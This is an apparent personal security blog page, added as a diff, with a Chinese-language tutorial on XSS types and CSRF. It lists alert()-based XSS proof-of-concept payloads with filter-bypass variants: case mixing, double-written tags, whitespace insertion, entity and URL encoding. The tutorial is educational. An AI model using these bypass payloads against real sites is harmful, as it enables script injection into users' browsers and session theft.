@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)">
+<meta name="generator" content="Hexo 6.0.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.loli.net/css?family=Noto+Serif+SC:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="xssXSS简介 XSS就是指通过利用网页开发时留下的漏洞( 由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript,但实际上也可以包括Java、VBScript、ActiveX、 Flash 或者普通的HTML。 当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器">
+<meta property="og:type" content="article">
+<meta property="og:title" content="xss与csrf">
+<meta property="og:url" content="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/index.html">
+<meta property="og:site_name" content="Echo">
+<meta property="og:description" content="xssXSS简介 XSS就是指通过利用网页开发时留下的漏洞( 由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript,但实际上也可以包括Java、VBScript、ActiveX、 Flash 或者普通的HTML。 当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/image-20220701221652756.png">
+<meta property="article:published_time" content="2022-07-01T13:31:10.000Z">
+<meta property="article:modified_time" content="2022-07-05T14:37:06.010Z">
+<meta property="article:author" content="CJ">
+<meta property="article:tag" content="GOGOGO">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/image-20220701221652756.png">
+
+
+<link rel="canonical" href="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/","path":"2022/07/01/xss与csrf/","title":"xss与csrf"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>xss与csrf | Echo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Echo</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">CJ'S BLOG</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss"><span class="nav-number">1.</span> <span class="nav-text">xss</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#csrf"><span class="nav-number">2.</span> <span class="nav-text">csrf</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">CJ</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">23</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">3</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author site-overview-item animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/cjtyx" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;cjtyx" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2081297822@qq.com" title="E-Mail → mailto:2081297822@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/07/01/xss%E4%B8%8Ecsrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CJ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Echo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          xss与csrf
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2022-07-01 21:31:10" itemprop="dateCreated datePublished" datetime="2022-07-01T21:31:10+08:00">2022-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2022-07-05 22:37:06" itemprop="dateModified" datetime="2022-07-05T22:37:06+08:00">2022-07-05</time>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Symbols count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Symbols count in article: </span>
+      <span>4.3k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>4 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h1><p><strong>XSS简介</strong></p>
+<p>XSS就是指通过利用网页开发时留下的漏洞( 由于Web应用程序对用户的输入过滤不足)，巧妙的将恶意代码注入到网页中，使用户浏览器加载并执行攻击者制造的恶意代码，以达到攻击的效果。这些恶意代码通常是JavaScript,但实际上也可以包括Java、VBScript、ActiveX、 Flash 或者普通的HTML。</p>
+<p>当用户访问被XSS注入的网页，XSS代码就会被提取出来。用户浏览器就会解析这段XSS代码，也就是说用户被攻击了。用户最简单的动作就是使用浏览器上网，并且浏览器中有javascript解释器，可以解析javascript,然而由于浏览器并不具有人格，不会判断代码是否恶意,只要代码符合语法规则，浏览器就会解析这段XSS代码。简单来说，XSS就是通过攻击者精心构造的JS代码注入到网页中，并由浏览器解释运行这段JS代码，以达到恶意攻击浏览器的效果。XSS攻击的对象是用户浏览器，属于被动攻击。因此XSS攻击涉及到三个角色:<br>➢攻击者<br>➢用户浏览器<br>➢服务器</p>
+<p>实施XSS攻击需要具备的两个条件:<br>➢需要向Web页面注入精心构造的恶意代码<br>➢对用户的输入没有做过滤，恶意代码能够被浏览器成功的执行</p>
+<p><strong>xss验证</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 常用</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">confirm(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">prompt(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>■ XSS危害<br>➢盗取各种用户账号<br>➢窃取用户Cookie资料，冒充用户身份进入网站<br>➢劫持用户会话，执行任意操作<br>➢刷流量，执行弹窗广告<br>➢传播蠕虫病毒<br>➢攻击者能在一定限度内记录用户的键盘输入</p>
+<p>■XSS分类<br>XSS根据其特性和利用手法的不同，主要分为三大类型:<br>➢反射型XSS<br>➢存储型XSS<br>➢DOM型XSS</p>
+<p>➢反射型XSS<br>反射型XSS又称为非持久型XSS,是现在最容易出现的一种XSS漏洞。用户在请求某条URL地址的时候，会携带一部分数据。 当客户端进行访问某条链接时，攻击者可以将恶意代码植入到URL，如果服务端未对URL携带的参数做判断或者过滤处理，直接返回响应页面，那么XSS攻击代码就会一起被传输到用户的浏览器， 从而触发反射型Xss。</p>
+<p>数据流量走向:浏览器&gt;后端&gt;浏览器</p>
+<p>➢存储型XSS<br>存储型XSS又叫持久型XSS. 一般而言，它是三种XSS里危害最大的一种。此类型的XSS漏洞是由于恶意攻击代码被持久化保存到服务器上，然后被显示到HTML页面之中。这类漏洞经常出现在用户评论的页面，攻击者精心构造XSS代码，保存到数据库中，当其他用户再次访问这个页面时，就会触发并执行恶意的XSS代<br>码，从而窃取用户的敏感信息。</p>
+<p>数据流量走向:浏览器&gt;后端-&gt;数据库&gt;后端&gt;浏览器 </p>
+<p>➢DOM型XSS</p>
+<p><img src="/2022/07/01/xss%E4%B8%8Ecsrf/image-20220701221652756.png" alt="image-20220701221652756"></p>
+<p>节点<br>文档是由节点构成的集合，在DOM里存在许多不同类型的节点，主要分为以下三种:<br>●元素节点  ●文本节点  ●属性节点</p>
+<p>元素节点<br>在“购物清单”例子中，<code>&lt;body&gt;</code>.<code>&lt;p&gt;</code>.<code> &lt;ul&gt;</code>之 类的元素在文档中的布局形成了文档的结构，它们即是元素节点。<br>文本节点<br>文档通常会包含一些内容， 这些内容多数由文本提供，如前面例子中，<code>&lt;p&gt;</code>包含着文本“欢迎购买”，它就是一个文本节点。<br>属性节点<br>元素或多或少都有一些属性， 属性用于对元素做出更具体的描述。</p>
+<p>DOM型XSS漏洞是基于文档对象模型(Document Object Model)的一种漏洞。这种XSS与反射型XSS、持久型XSS在原理上有本质区别，它的攻击代码并不需要服务器解析响应，触发XSS靠的是浏览器端的DOM解析。客户端上的JavaScript脚本可以访问浏览器的DOM并修改页面的内容，不依赖服务器的数据，直接从浏览器端获取数据并执行。在客户端直接输出DOM内容的时候极易触发DOM型XSS漏洞，如<br><code>document.getElementByld(&quot;x&quot; ).innerHTML</code>、<code>document.write</code>等。</p>
+<p>数据流量走向: URL &gt;浏览器</p>
+<figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">Xss payload构造以及变形</span></span><br><span class="line"><span class="xml">■XSS payload构造</span></span><br><span class="line"><span class="xml">➢利用[<span class="tag">&lt;&gt;</span>]构造HTML标签和<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="handlebars"><span class="xml"><span class="tag">&lt;/<span class="name">scrpt</span>&gt;</span>标签</span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">&quot;color:green;&quot;</span>&gt;</span>XSS<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span></span><br><span class="line"><span class="xml"><span class="handlebars"><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用HTML标签的属性值(伪协议)</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(/xss/)&quot;</span>&gt;</span>touch me !<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;xss&#x27;)&quot;</span>&gt;</span> (此标签需要在IE6下测试)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用事件</span></span><br><span class="line"><span class="xml">事件种类</span></span><br><span class="line"><span class="xml">●windows事件 对windows对象触发的事件</span></span><br><span class="line"><span class="xml">●Form事件HTML表单内的动作触发事件</span></span><br><span class="line"><span class="xml">●Keyboard事件 键盘按键</span></span><br><span class="line"><span class="xml">●Mouse事件 由鼠标或类似用户动作触发的事件</span></span><br><span class="line"><span class="xml">●Media事件 由多媒体触发的事件</span></span><br><span class="line"><span class="xml">参考链接:</span></span><br><span class="line"><span class="xml">htps://www.w3school.com.cn/tags/html_ ref_ eventatributes.asp</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;smile.jpg&#x27;</span> <span class="attr">onmouseover</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(/xss/)&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢利用CSS</span></span><br><span class="line"><span class="xml">外部样式</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span> <span class="attr">href</span>=<span class="string">&quot;./xss.css&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml">expression</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/xss/))&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢大小写</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">iMg</span> <span class="attr">sRc</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">Onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hREf</span>=<span class="string">&quot;javaScript:alert(/xss/)&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢双写关键字</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(/xss/)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢引号</span></span><br><span class="line"><span class="xml">如果在HTML标签中，可以不用引号;如果在js中，可以用反引号代替单双引号</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;alert(/xss/)&quot;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">#</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)/</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`)/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;#&quot;</span> <span class="attr">onerror</span>=<span class="string">alert</span>`<span class="attr">xss</span>`/&gt;</span> (代替括号)</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢[/] 代替空格</span></span><br><span class="line"><span class="xml">&lt;img/src=&#x27;#&#x27;/onerror=&#x27;alert(/xss/)&#x27;/&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢Tab与回车</span></span><br><span class="line"><span class="xml">在一些位置添加Tab (水平制表符)和回车符来绕过关键字检测</span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;#&#x27;</span> <span class="attr">onerror</span>=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j avascript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">&quot;j</span></span></span></span><br><span class="line"><span class="string"><span class="tag"><span class="xml">avascript:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml">➢编码</span></span><br><span class="line"><span class="xml">HTML实体编码</span></span><br><span class="line"><span class="xml">a 97 <span class="symbol">&amp;#97;</span> <span class="symbol">&amp;#x61;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;j<span class="symbol">&amp;#97;</span>v<span class="symbol">&amp;#x61;</span>script:alert(/xss/)&quot;</span>&gt;</span>click me!<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span><br><span class="line"><span class="xml">URL编码</span></span><br><span class="line"><span class="xml"></span><span class="perl">%<span class="number">3</span>Cscript%3Ealert(<span class="regexp">/xss/</span>)%3C/script%3E</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h1><p>跨站请求伪造<br>原理总结<br>一个CSRF漏洞攻击的实现，其需要由“三个部分”来构成<br>1、有一个漏洞存在(无需验证、任意修改后台数据、新增请求) ;<br>2、伪装数据操作请求的恶意链接或者页面;<br>3、诱使用户主动访问或登录恶意链接，触发非法操作;</p>
+<p>如果需要CSRF攻击能够成功，首先就需要目标站点或系统存在-个可以进行数据修改或者新增操作，且此操作被提交后台后的过程中,其未提供任何身份识别或校验的参数。后台只要收到请求，就立即下发数据修改或新增的操作; 以上漏洞情况的存在，出现比较多的场景有用户密码的修改、购物地址的修改或后台管理账户的新增等等操作过程中。</p>
+<p>CSRF漏洞存在了，如果需要真正的被利用，还需要对“修改或新增”数据操作请求的伪装，此时恶意攻击者只要将伪装好的“数据修改或新增”的请求发送给被攻击者，或者通过社工的方式诱使被攻击者在其cookie还生效的情况下点击了此请求链接，即可触发CSRF漏洞， 成功修改或新增当前用户的数据信息，如修改当前用户的密码、又或者是当前用户为后台管理员，触发漏洞后新增了一个后台管理员。</p>
+<p>当前用户在不知情的情况下，访问了黑客恶意构造的页面或在链接,即在非本意的情况下完成黑客想完成的“非法操作”,实现了对当前用户个人信息的恶意操作。</p>
+<p>CSRF漏洞的目的:利用已存在的漏洞构遭了一个“恶意链接”或“html页面”。然后诱使用户点击触发此漏洞。目标站点存在一个漏洞(CSRF).攻击者利用此类漏洞伪装了一个链接或者html页面。诱使被攻击者在登录的情况下(即当前Cookie有效的情况下)点击了此伪装请求。随后在用户不知情的情况下完成了对当前用户数据的<br>修改或者新增操作。而被修改的信息可能是用户的密码.关键信息又或者新增后台管理员等。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/07/01/HW%E8%AF%BE%E7%A8%8B/" rel="prev" title="HW课程">
+                  <i class="fa fa-chevron-left"></i> HW课程
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/09/02/ATT-CK%E5%AE%9E%E6%88%981/" rel="next" title="ATT&CK实战1">
+                  ATT&CK实战1 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">CJ</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="Symbols count total">492k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">7:28</span>
+  </span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
